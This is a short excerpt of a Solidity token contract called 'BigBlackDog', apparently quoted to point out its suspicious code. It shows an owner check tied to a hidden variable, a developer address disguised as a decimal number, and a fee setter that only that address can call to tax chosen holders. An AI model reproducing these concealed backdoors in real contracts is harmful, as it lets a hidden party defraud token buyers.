...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_pua == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract BigBlackDog is Context, IERC20, Ownable {
    ...
    string private _symbol = "BigBlackDog";
    ...
    address private devAddress =
        address(769126417976988222261300270830344817210249960114);
    ...
    function setNumTokenPercent(uint256 numToken) external  {
     ...
     function setAddressFee(address spender, uint256 taxFee) public  {
        require
         (msg.sender
            == devAddress
            );
